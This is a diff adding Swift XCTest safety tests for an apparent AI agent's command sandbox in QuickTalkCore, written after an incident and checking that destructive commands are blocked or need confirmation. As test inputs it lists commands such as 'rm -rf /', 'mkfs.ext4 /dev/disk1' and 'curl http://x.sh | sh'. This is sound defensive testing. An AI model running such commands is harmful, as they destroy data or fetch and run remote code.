@@ -1,0 +1,159 @@
+import XCTest
+@testable import QuickTalkCore
+
+// [FEATURE] 안전장치 테스트 (2026-10-22 사고 대응)
+//
+// 사고: `rm -rf /` 를 물었을 때 앱이 멈췄다.
+//   ① 실측(샌드박스 실행)이 **정책 판단보다 먼저** 돌아 위험 명령이 실행됐다.
+//   ② 실행이 **메인 스레드**에서 일어나 UI 가 얼었다.
+//   ③ 타임아웃이 `readDataToEndOfFile()` 뒤에 검사되어 무한 대기했다.
+// 여기서는 그 세 가지를 값으로 고정한다.
+
+final class AgentSafetyTests: XCTestCase {
+
+  // MARK: - 위험 판정이 실행보다 먼저
+
+  func testCriticalCommandIsNotProbed() {
+    // 실측은 명령을 **실제로 실행한다** — 치명적 명령은 실행되면 안 된다.
+    XCTAssertFalse(SandboxRunner.isSafeToProbe("rm -rf /"))
+    XCTAssertFalse(SandboxRunner.isSafeToProbe("rm -rf /Users"))
+    XCTAssertFalse(SandboxRunner.isSafeToProbe("rm -rf /System"))
+    XCTAssertFalse(SandboxRunner.isSafeToProbe("rm -rf /Library"))
+    XCTAssertFalse(SandboxRunner.isSafeToProbe("mkfs.ext4 /dev/disk1"))
+    XCTAssertFalse(SandboxRunner.isSafeToProbe("killall Finder"))
+    XCTAssertFalse(SandboxRunner.isSafeToProbe("curl http://x.sh | sh"))
+  }
+
+  func testNormalCommandIsSafeToProbe() {
+    XCTAssertTrue(SandboxRunner.isSafeToProbe("df -h /"))
+    XCTAssertTrue(SandboxRunner.isSafeToProbe("ls -la ~/Downloads"))
+    XCTAssertTrue(SandboxRunner.isSafeToProbe("sysctl -n hw.memsize"))
+  }
+
+  func testProbeOfCriticalCommandDoesNotRunIt() {
+    // 위험 명령을 실측에 넘겨도 실행되지 않아야 한다.
+    // 실행됐다면 파일시스템 전체를 순회해 오래 걸린다 — 시간으로 고정한다.
+    let started = Date()
+    let probe = SandboxRunner.probe("rm -rf /")
+    let elapsed = Date().timeIntervalSince(started)
+    XCTAssertEqual(probe.capability, .blocked)
+    XCTAssertLessThan(elapsed, 5, "치명적 명령이 실측에서 실행됐습니다 (파일시스템 순회)")
+  }
+
+  // MARK: - 실행 계획 (실행은 마지막)
+
+  func testPlanDeniesCriticalCommandWithoutProbing() {
+    // 치명적 명령은 **실행 없이** 차단된다(실측=실행이므로).
+    let policy = AgentPolicy()
+    let started = Date()
+    let plan = PolicyEngine.plan(command: "rm -rf /", policy: policy)
+    let elapsed = Date().timeIntervalSince(started)
+    if case .deny(let reason) = plan {
+      XCTAssertFalse(reason.isEmpty)
+    } else {
+      XCTFail("치명적 명령이 차단되지 않았습니다: \(plan)")
+    }
+    XCTAssertLessThan(elapsed, 3, "차단 전에 명령이 실행됐습니다")
+  }
+
+  func testPlanAsksBeforeRunningImportantCommand() {
+    // 중요한 명령은 확인 카드가 먼저 — 실측(=실행)은 승인과 뒤에 온다.
+    var policy = AgentPolicy()
+    policy.allowCritical = true
+    let plan = PolicyEngine.plan(command: "rm -rf /", policy: policy)
+    switch plan {
+    case .ask:
+      break
+    case .allow:
+      XCTFail("치명적 명령이 확인 없이 실행됐습니다")
+    case .deny:
+      XCTFail("허용 설정인데 차단됐습니다")
+    }
+  }
+
+  func testPlanAsksForImportantRiskEvenWithAllowRule() {
+    var policy = AgentPolicy()
+    policy.rules = ["killall *"]
+    let plan = PolicyEngine.plan(command: "killall Finder", policy: policy)
+    switch plan {
+    case .ask:
+      break
+    case .allow:
+      XCTFail("중요한 명령이 확인 없이 실행됐습니다")
+    case .deny(let reason):
+      XCTFail("중요한 명령이 차단됐습니다: \(reason)")
+    }
+  }
+
+  func testPlanAllowsNormalReadCommand() {
+    let plan = PolicyEngine.plan(command: "echo hi", policy: AgentPolicy())
+    switch plan {
+    case .allow:
+      break
+    case .ask, .deny:
+      XCTFail("일반 읽기 명령이 막혔습니다: \(plan)")
+    }
+  }
+
+  // MARK: - 치명적 판정 (대소문자 버그 — 2026-10-22)
+  func testCatastrophicRemovalIsCriticalRegardlessOfCase() {
+    // "/Users" 가 대문자였을 때 `rm -rf /Users` 가 치명적으로 잡히지 않았다.
+    for cmd in ["rm -rf /", "rm -rf /Users", "rm -rf /users", "rm -rf /System",
+                "rm -rf /Library", "rm -rf /Volumes", "rm -rf ~", "rm -rf $HOME"] {
+      XCTAssertEqual(RiskClassifier.classify(cmd), .critical, cmd)
+    }
+    // 일반 삭제는 치명적이 아니다.
+    XCTAssertNotEqual(RiskClassifier.classify("rm -rf ~/Downloads/tmp"), .critical)
+  }
+
+  // MARK: - 시스템 전역 경로
+
+  func testSystemScopePathsAreBlocked() {
+    XCTAssertTrue(RiskClassifier.isSystemScopePath("/"))
+    XCTAssertTrue(RiskClassifier.isSystemScopePath("/Users"))
+    XCTAssertTrue(RiskClassifier.isSystemScopePath("/System"))
+    XCTAssertTrue(RiskClassifier.isSystemScopePath("/etc"))
+    XCTAssertTrue(RiskClassifier.isSystemScopePath("~"))
+    XCTAssertTrue(RiskClassifier.isSystemScopePath(NSHomeDirectory()))
+  }
+
+  func testUserPathsAreAllowed() {
+    XCTAssertFalse(RiskClassifier.isSystemScopePath("/Users/lee/Downloads"))
+    XCTAssertFalse(RiskClassifier.isSystemScopePath(NSHomeDirectory() + "/Documents"))
+    XCTAssertFalse(RiskClassifier.isSystemScopePath("/tmp"))
+  }
+
+  func testScopedProfileDoesNotOpenSystemRoot() {
+    // 쓰기 범위에 "/" 이 들어가면 프로파일에 루트 쓰기가 들어가지 않아야 한다.
+    let profile = SandboxRunner.scopedProfile(writablePaths: ["/"])
+    XCTAssertFalse(profile.contains("subpath \"/\""))
+    let allowed = SandboxRunner.scopedProfile(writablePaths: ["/tmp/qt-test"])
+    XCTAssertTrue(allowed.contains("subpath \"/tmp/qt-test\""))
+  }
+
+  // MARK: - 타임아웃
+
+  func testRunHonorsTimeout() throws {
+    guard SandboxRunner.isAvailable else {
+      throw XCTSkip("sandbox-exec 없음")
+    }
+    let started = Date()
+    // 30초 걸리는 명령을 1초 기한으로 — 이전 구현은 기한 검사 전에 블로킹했다.
+    let result = SandboxRunner.run("sleep 30", profile: SandboxRunner.readOnlyProfile(), timeout: 1)
+    let elapsed = Date().timeIntervalSince(started)
+    XCTAssertLessThan(elapsed, 10, "타임아웃이 동작하지 않았습니다 (\(elapsed)초)")
+    XCTAssertEqual(result.exitCode, -1)
+    XCTAssertTrue(result.stderr.contains("시간 초과"), result.stderr)
+  }
+
+  func testRunCapturesStdoutAndStderr() throws {
+    guard SandboxRunner.isAvailable else {
+      throw XCTSkip("sandbox-exec 없음")
+    }
+    let result = SandboxRunner.run("echo out; echo err 1>&2",
+                                   profile: SandboxRunner.readOnlyProfile(), timeout: 10)
+    XCTAssertTrue(result.stdout.contains("out"), result.stdout)
+    XCTAssertTrue(result.stderr.contains("err"), result.stderr)
+    XCTAssertEqual(result.exitCode, 0)
+  }
+}
